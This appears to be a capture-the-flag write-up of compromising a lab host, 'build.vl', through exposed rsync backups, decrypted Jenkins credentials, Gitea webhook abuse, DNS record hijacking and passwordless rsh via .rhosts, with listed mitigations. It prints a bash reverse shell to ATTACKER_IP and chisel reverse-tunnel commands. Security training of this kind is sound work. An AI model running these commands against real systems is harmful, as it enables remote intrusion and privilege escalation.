
## TL;DR
 Leveraged exposed services (Gitea, Jenkins, Rsync, and legacy R protocols) and weak credential to escalate privileges from initial access to root. Key vulnerabilities included insecure credential storage, DNS misconfigurations, and improper use of `.rhosts` for authentication.  


### Key Vulnerabilities  
1. **Insecure Credential Storage:** Jenkins credentials stored in plaintext/weakly encrypted formats.  
2. **Legacy Service Exposure:** R-services (rsh, rexec) enabled passwordless access via `.rhosts`.  
3. **DNS Misconfiguration:** Publicly modifiable DNS records allowed spoofing critical domains.  
4. **Overprivileged Webhooks:** Jenkins pipeline triggered arbitrary code execution via Gitea.  

### Mitigations  
1. **Secure Jenkins Credentials:** Use Jenkins’ built-in credential manager with strong encryption.  
2. **Disable Legacy Protocols:** Replace R-services with SSH and enforce key-based authentication.  
3. **Harden DNS:** Restrict DNS modifications and implement DNSSEC.  
4. **Audit Webhooks:** Validate webhook payloads and restrict execution scope.  


## Methodology  

### 1. Enumeration  

#### **Network Scanning**  
An `nmap` scan revealed critical services:  
```bash
22/tcp    - SSH  
53/tcp    - DNS  
512-514/tcp - Legacy R-services (rexec, rlogin, rsh)  
873/tcp   - Rsync  
3000/tcp  - Gitea (Git hosting)  
```

#### **Gitea Exposure (Port 3000)**  
- Discovered a repository at `http://10.10.115.233:3000/buildadm/dev`.  
- Commit history exposed a `Jenkinsfile` and the domain `build.vl`.  

#### **DNS Misconfiguration**  
- `dig a build.vl @10.10.115.233` returned an SOA record pointing to `a.misconfigured.dns.server.invalid`, indicating DNS misconfiguration.  

#### **Rsync Exploitation (Port 873)**  
- Listed accessible shares:  
  ```bash
  rsync -av --list-only rsync://build.vl/
  backups        	backups
  ```
- Downloaded `jenkins.tar.gz` from the `backups` share, containing Jenkins configuration files.  

#### **Jenkins Credential Extraction**  
- Extracted encrypted credentials from `jobs/build/config.xml`:  
  ```xml
  <username>buildadm</username>
  <password>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}</password>
  ```
- Decrypted credentials using `master.key` and `hudson.util.Secret` files from the Jenkins `secrets/` directory.  
- **Credentials Recovered:** `buildadm:[REDACTED]` (Gitea access).  

---

### 2. Initial Compromise  

#### **Gitea Webhook Abuse**  
- A webhook in the repository (`http://172.18.0.3:8080/gitea-webhook/post`) triggered Jenkins pipeline execution.  
- Modified the `Jenkinsfile` to inject a reverse shell:  
  ```bash
  bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
  ```
- **Result:** Reverse shell as `buildadm` inside a Docker container.  

#### **User Flag**  
- Located at `/root/user.txt`:  
  ```bash
  <USER_FLAG>
  ```

---

### 3. Lateral Movement  

#### **Docker Escape Analysis**  
- The container lacked networking tools (`ifconfig`, `ip`).  
- Discovered a `.rhosts` file in `/root`:  
  ```bash
  admin.build.vl +  
  intern.build.vl +
  ```

#### **Network Pivoting with Chisel**  
- Established a SOCKS tunnel to map the internal network:  
  - Attacker: `./chisel server -p 8000 --reverse`  
  - Victim: `./chisel client ATTACKER_IP:8000 R:socks`  
- Proxied traffic through `proxychains` to enumerate internal hosts.  

#### **MySQL Database Access**  
- Connected to MySQL as `root` via `proxychains`:  
  ```bash
  proxychains mysql -h build.vl -u root
  ```
- Extracted PowerDNS admin credentials from the `powerdnsadmin` database:  
  ```sql
  SELECT * FROM user WHERE username='admin';  
  -- Password hash: [REDACTED] (bcrypt)
  ```

#### **PowerDNS Takeover**  
- Reset the admin password via hash replacement in the database.  
- Modified DNS records to resolve `admin.build.vl` to the attacker’s IP.  

---

### 4. Privilege Escalation  

#### **Abusing .rhosts**  
- With `admin.build.vl` pointing to the attacker’s IP, `rsh` granted root access:  
  ```bash
  rsh root@build.vl  # No password required due to .rhosts
  ```
- **Result:** Root shell on the host system.  

#### **Root Flag**  
- Located at `/root/root.txt`:  
  ```bash
  <ROOT_FLAG>
  ```

---

